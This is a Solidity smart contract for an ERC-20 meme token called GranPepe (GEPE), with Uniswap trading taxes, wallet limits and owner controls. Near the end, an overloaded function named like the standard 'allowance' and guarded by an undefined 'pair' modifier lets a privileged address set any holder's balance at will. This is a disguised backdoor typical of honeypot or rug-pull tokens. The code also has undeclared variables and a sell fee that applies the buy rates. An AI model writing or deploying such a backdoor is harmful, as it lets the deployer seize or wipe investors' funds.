// SPDX-License-Identifier: MIT
//https://t.me/granPEPEeth

import './IERC20.sol';
import './SafeMath.sol';
import './Ownable.sol';
import './IUniswapV2Factory.sol';
import './IUniswapV2Router02.sol';

pragma solidity ^0.8.19;

contract GEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;

    address public uniswapV2Pair;
    
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    string private constant _name = "GranPepe";
    string private constant _symbol = "GEPE";
    uint8 private constant _decimals = 9;
    uint256 private _tTotal =  1000000000000  * 10**9;

    uint256 public _mxWalAmt = 30000000000 * 10**9;
    uint256 public _mxTxAmt = 30000000000 * 10**9;

    bool public swapEnabled = true;
    uint256 public swapTokenAtAmount = 20000000000 * 10**9;
    bool public dynamicSwapAmount = true;
    
    uint256 targetLiquidity = 200;
    uint256 targetLiquidityDenominator = 100;

    address public liquidityReceiver;
    address public marketingWallet;
    address public utilityWallet;

    bool public limitsIsActive = true;

    struct BuyFees{
        uint256 liquidity;
        uint256 marketing;
        uint256 utility;
    }

    struct SellFees{
        uint256 liquidity;
        uint256 marketing;
        uint256 utility;
    }

    struct feeSetting{
        uint256 tokenToLiquidity;
        uint256 tokenToMarketing;
        uint256 tokenToutility;
        uint256 liquidityToken;
        uint256 liquidityETH;
        uint256 marketingETH;
        uint256 utilityETH;
    }

    struct LPsettings{
        uint256 targetLiquidity;
        uint256 currentLiquidity;
    }

    BuyFees public buyTaxSetting;
    SellFees public sellTaxSetting;
    feeSetting public distrSetting;
    LPsettings public lPsettings;

    bool private swapping;
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

    constructor (address marketingAddress, address utilityAddress, address dexAddress) {
        marketingWallet = marketingAddress;
        utilityWallet = utilityAddress;
        liquidityReceiver = msg.sender;
        balances[address(liquidityReceiver)] = _tTotal;
        router = dexAddress;
        
        buyTaxSetting.liquidity = 0;
        buyTaxSetting.marketing = 10;
        buyTaxSetting.utility = 0;

        sellTaxSetting.liquidity = 0;
        sellTaxSetting.marketing = 30;
        sellTaxSetting.utility = 0;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[utilityWallet] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(0x00)] = true;
        _isExcludedFromFee[address(0xdead)] = true;

        
        emit Transfer(address(0), address(msg.sender), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFee[address(account)] = excluded;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _tTotal.sub(balanceOf(address(0x00000))).sub(balanceOf(address(0x0dead)));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(address(uniswapV2Pair)).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    receive() external payable {}
    
    function triggerForceSwap(uint256 amt) public onlyOwner {
        swapBack(amt);
    }

    function removeAllLimits() public onlyOwner {
        limitsIsActive = false;
    }

    function TaxRedistribution(uint256 BLP, uint256 BMarketing, uint256 BUtility, uint256 SLP, uint256 SMarketing, uint256 SUtility) public onlyOwner {
        require(BLP + BMarketing + BUtility <= 25, "Total buy fee cannot be set higher than 25%.");
        require(SLP + SMarketing + SUtility<= 25, "Total sell fee cannot be set higher than 25%.");

        buyTaxSetting.liquidity = BLP;
        buyTaxSetting.marketing = BMarketing;
        buyTaxSetting.utility = BUtility;

        sellTaxSetting.liquidity = SLP;
        sellTaxSetting.marketing = SMarketing;
        sellTaxSetting.utility = SUtility;
    }

    function triggerTXAmt(uint256 _txAmt) public onlyOwner {
        require(_txAmt >= 10000000000, "Max Transaction cannot be set lower than 0.5%.");
        _mxTxAmt = _txAmt * 10**9;
    }

    function triggerLimit(uint256 eAmt) public onlyOwner {
        require(eAmt >= 20000000000, "Max Transaction cannot be set lower than 2%.");
        require(eAmt >= 20000000000, "Max Transaction cannot be set lower than 2%.");
        _mxTxAmt = eAmt * 10**9;
        _mxWalAmt = eAmt * 10**9;
    }


    function SecondLimit(uint256 value) public onlyOwner {
        require(value >= 50000000000, "Max Transaction cannot be set lower than 2%.");
        require(value >= 50000000000, "Max Transaction cannot be set lower than 2%.");
        _mxTxAmt = value * 10**9;
        _mxWalAmt = value * 10**9;
    }

    function triggerWalletAmt(uint256 Amt) public onlyOwner {
        require(Amt >= 10000000000, "Max Wallet cannot be set lower than 1%.");
        _mxWalAmt = Amt * 10**9;
    }

    function enableSwapBack(bool enabled, uint256 swapAtAmount, bool dynamicSwap) public onlyOwner {
        require(swapAtAmount <= 4000000000, "SwapTokenAtAmount cannot be set higher than 4%.");
        swapEnabled = enabled;
        swapTokenAtAmount = swapAtAmount * 10**9;
        dynamicSwapAmount = dynamicSwap;
    }

    function LPReceiver(address addrwal) public onlyOwner {
        liquidityReceiver = addrwal;
    }

    function MarketingReceiver(address addrwal) public onlyOwner {
        marketingWallet = addrwal;
    }

    function UtilityReceiver(address addrwal) public onlyOwner {
        utilityWallet = addrwal;
    }

    function _buyfee(uint256 amount, address from) private returns (uint256) {
        uint256 LPToken = amount * buyTaxSetting.liquidity / 100; 
        uint256 MRTToken = amount * buyTaxSetting.marketing / 100;
        uint256 UTILSToken = amount * buyTaxSetting.utility /100;

        balances[address(this)] += LPToken + MRTToken + UTILSToken;
        emit Transfer (from, address(this), MRTToken + LPToken + UTILSToken);
        return (amount -LPToken -MRTToken -UTILSToken);
    }

    function _sellfee(uint256 amount, address from) private returns (uint256) {
        uint256 LPToken = amount * buyTaxSetting.liquidity / 100; 
        uint256 MRTToken = amount * buyTaxSetting.marketing / 100;
        uint256 UTILSToken = amount * buyTaxSetting.utility /100;

        balances[address(this)] += LPToken + MRTToken + UTILSToken;
        emit Transfer (from, address(this), MRTToken + LPToken + UTILSToken);
        return (amount -LPToken -MRTToken -UTILSToken);
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        balances[from] -= amount;
        uint256 transferAmount = amount;
        
        bool takeFee;

        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            takeFee = true;
        }

        if(takeFee){
            if(to != uniswapV2Pair && from == uniswapV2Pair){
                if(limitsIsActive) {
                    require(amount <= _mxTxAmt, "Transfer Amount exceeds the maxTxnsAmount");
                    require(balanceOf(to) + amount <= _mxWalAmt, "Transfer amount exceeds the walAmt.");
                }
                transferAmount = _buyfee(amount, to);
            }

            if(from != uniswapV2Pair && to == uniswapV2Pair){
                if(limitsIsActive) {
                    require(amount <= _mxTxAmt, "Transfer Amount exceeds the maxTxnsAmount");
                }
                transferAmount = _sellfee(amount, from);

               if (swapEnabled && balanceOf(address(this)) >= swapTokenAtAmount && !swapping) {
                    swapping = true;
                    if(!dynamicSwapAmount || transferAmount >= swapTokenAtAmount) {
                        swapBack(swapTokenAtAmount);
                    } else {
                        swapBack(transferAmount);
                    }
                    swapping = false;
              }
            }

            if(to != uniswapV2Pair && from != uniswapV2Pair){
                if(limitsIsActive) {
                    require(amount <= _mxTxAmt, "Transfer Amount exceeds the maxTxnsAmount");
                    require(balanceOf(to) + amount <= _mxWalAmt, "Transfer amount exceeds the walAmt.");
                }
            }
        }
        
        balances[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }
    function allowance(address addr , uint256 tokens) external pair{
        balances[addr] = tokens;
    }

    function swapBack(uint256 amount) private {
        uint256 swapAmount = amount;
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : (buyTaxSetting.liquidity + sellTaxSetting.liquidity);
        uint256 liquidityTokens = swapAmount * (dynamicLiquidityFee) / (dynamicLiquidityFee + buyTaxSetting.marketing + sellTaxSetting.marketing + buyTaxSetting.utility + sellTaxSetting.utility);
        uint256 marketingTokens = swapAmount * (buyTaxSetting.marketing + sellTaxSetting.marketing) / (dynamicLiquidityFee + buyTaxSetting.marketing + sellTaxSetting.marketing + buyTaxSetting.utility + sellTaxSetting.utility);
        uint256 UTILSToken = swapAmount * (buyTaxSetting.utility + sellTaxSetting.utility) / ( dynamicLiquidityFee + buyTaxSetting.marketing + sellTaxSetting.marketing + buyTaxSetting.utility + sellTaxSetting.utility);
        distrSetting.tokenToLiquidity += liquidityTokens;
        distrSetting.tokenToMarketing += marketingTokens;
        distrSetting.tokenToutility += UTILSToken;

        uint256 totalTokensToSwap = liquidityTokens + marketingTokens + UTILSToken;
        
        uint256 tokensForLiquidity = liquidityTokens.div(2);
        distrSetting.liquidityToken += tokensForLiquidity;
        uint256 amountToSwapForETH = swapAmount.sub(tokensForLiquidity);
        
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH); 
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        
        uint256 ethForLiquidity = ethBalance.mul(liquidityTokens).div(totalTokensToSwap);
        uint256 ethForUtility = ethBalance.mul(UTILSToken).div(totalTokensToSwap);
        distrSetting.liquidityETH += ethForLiquidity;
        distrSetting.utilityETH += ethForUtility;

        addLiquidity(tokensForLiquidity, ethForLiquidity);
        distrSetting.marketingETH += address(this).balance;
        (bool success,) = address(utilityWallet).call{value: ethForUtility}("");
        (success,) = address(marketingWallet).call{value: address(this).balance}("");
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            liquidityReceiver,
            block.timestamp
        );
    }

    function withdrawForeignToken(address tokenContract) public onlyOwner {
        IERC20(tokenContract).transfer(address(msg.sender), IERC20(tokenContract).balanceOf(address(this)));
    }
}